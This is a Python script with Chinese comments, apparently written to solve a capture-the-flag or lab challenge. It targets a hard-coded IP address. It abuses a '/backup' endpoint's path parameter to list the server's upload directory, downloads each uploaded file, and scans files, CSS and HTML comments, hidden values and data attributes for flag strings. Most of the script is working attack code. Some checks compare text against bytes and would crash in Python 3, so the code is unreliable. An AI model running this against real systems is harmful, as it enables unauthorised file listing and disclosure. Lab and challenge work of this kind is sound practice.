import requests
import re
import os

os.environ.pop('HTTP_PROXY', None)
os.environ.pop('HTTPS_PROXY', None)
requests.packages.urllib3.disable_warnings()

TARGET = "http://119.29.238.216:8088"
session = requests.Session()
session.verify = False
session.proxies = {}
session.headers.update({"User-Agent": "Mozilla/5.0"})

print("="*70)
print("检查上传目录中的所有文件内容")
print("="*70)

# 获取上传目录文件列表
r = session.get(f"{TARGET}/backup", params={"path": "F:\\small peoject\\python-lab\\uploads"}, timeout=15)
if r.status_code == 200:
    body = re.search(r'<pre>(.*?)</pre>', r.text, re.DOTALL)
    if body:
        files_text = body.group(1).strip()
        files = [f.strip() for f in files_text.split('\n') if f.strip()]
        
        print(f"文件列表: {files}")
        
        # 检查每个文件
        for filename in files:
            if filename and filename != '.gitkeep':
                print(f"\n{'='*50}")
                print(f"检查文件: {filename}")
                print(f"{'='*50}")
                
                # 下载文件
                r2 = session.get(f"{TARGET}/uploads/{filename}", timeout=15)
                if r2.status_code == 200:
                    content = r2.content
                    
                    # 显示文件信息
                    print(f"Content-Type: {r2.headers.get('Content-Type', '')}")
                    print(f"Content-Length: {len(content)}")
                    
                    # 显示十六进制内容（前100字节）
                    hex_content = content[:100].hex()
                    print(f"十六进制内容: {hex_content}")
                    
                    # 尝试解码为文本
                    try:
                        text_content = content.decode('utf-8', errors='replace')
                        print(f"文本内容: {text_content[:200]}")
                        
                        # 搜索flag
                        flag_match = re.search(r'flag\{[^}]+\}', text_content, re.IGNORECASE)
                        if flag_match:
                            print(f"\n🚩🚩🚩 FLAG FOUND IN {filename}: {flag_match.group(0)} 🚩🚩🚩")
                            exit(0)
                    except:
                        pass
                    
                    # 检查是否包含特殊字符串
                    if "<?php" in content.lower():
                        print(f"⚠️ 包含PHP代码")
                        # 显示PHP代码内容
                        php_start = content.find("<?php".encode()) if "<?php".encode() in content else content.find("<?".encode())
                        if php_start >= 0:
                            php_code = content[php_start:php_start+200].decode('utf-8', errors='replace')
                            print(f"PHP代码: {php_code}")
                    
                    if "import os" in content.lower() or "exec(" in content.lower():
                        print(f"⚠️ 包含Python代码")
                    
                    if "flag" in content.lower():
                        print(f"⚠️ 包含flag关键词")
                        # 找到flag关键词的位置
                        flag_pos = content.lower().find("flag")
                        flag_context = content[flag_pos:flag_pos+50].decode('utf-8', errors='replace')
                        print(f"flag上下文: {flag_context}")
                else:
                    print(f"下载失败: {r2.status_code}")

print("\n" + "="*70)
print("检查CSS文件中的隐藏信息")
print("="*70)

r = session.get(f"{TARGET}/style.css", timeout=15)
print(f"\nCSS完整内容:\n{r.text}")

# 搜索flag
flag_match = re.search(r'flag\{[^}]+\}', r.text, re.IGNORECASE)
if flag_match:
    print(f"\n🚩🚩🚩 FLAG FOUND IN CSS: {flag_match.group(0)} 🚩🚩🚩")
    exit(0)

# 搜索隐藏注释
comments = re.findall(r'/\*.*?\*/', r.text)
print(f"\nCSS注释: {comments}")

for comment in comments:
    flag_match = re.search(r'flag\{[^}]+\}', comment, re.IGNORECASE)
    if flag_match:
        print(f"\n🚩🚩🚩 FLAG FOUND IN CSS COMMENT: {flag_match.group(0)} 🚩🚩🚩")
        exit(0)

print("\n" + "="*70)
print("检查HTML注释和隐藏内容")
print("="*70)

pages = [
    "/",
    "/login",
    "/upload",
    "/search",
    "/ping",
    "/backup",
    "/include",
    "/message",
    "/dashboard",
    "/upload-source",
]

for page in pages:
    r = session.get(f"{TARGET}{page}", timeout=15)
    
    # 搜索HTML注释
    comments = re.findall(r'<!--(.*?)-->', r.text, re.DOTALL)
    if comments:
        print(f"\n{page}的注释: {comments}")
        
        for comment in comments:
            flag_match = re.search(r'flag\{[^}]+\}', comment, re.IGNORECASE)
            if flag_match:
                print(f"\n🚩🚩🚩 FLAG FOUND IN COMMENT: {flag_match.group(0)} 🚩🚩🚩")
                exit(0)
    
    # 搜索隐藏属性
    hidden = re.findall(r'hidden[^>]*value=["\']([^"\']+)["\']', r.text)
    if hidden:
        print(f"\n{page}的隐藏值: {hidden}")
        
        for h in hidden:
            if len(h) > 50:  # 可能包含flag
                print(f"可疑隐藏值: {h}")
                
                flag_match = re.search(r'flag\{[^}]+\}', h, re.IGNORECASE)
                if flag_match:
                    print(f"\n🚩🚩🚩 FLAG FOUND IN HIDDEN: {flag_match.group(0)} 🚩🚩🚩")
                    exit(0)
    
    # 搜索data属性
    data_attrs = re.findall(r'data-[a-z]+=["\']([^"\']+)["\']', r.text)
    if data_attrs:
        print(f"\n{page}的data属性: {data_attrs}")
        
        for data in data_attrs:
            flag_match = re.search(r'flag\{[^}]+\}', data, re.IGNORECASE)
            if flag_match:
                print(f"\n🚩🚩🚩 FLAG FOUND IN DATA ATTR: {flag_match.group(0)} 🚩🚩🚩")
                exit(0)

print("\n测试完成")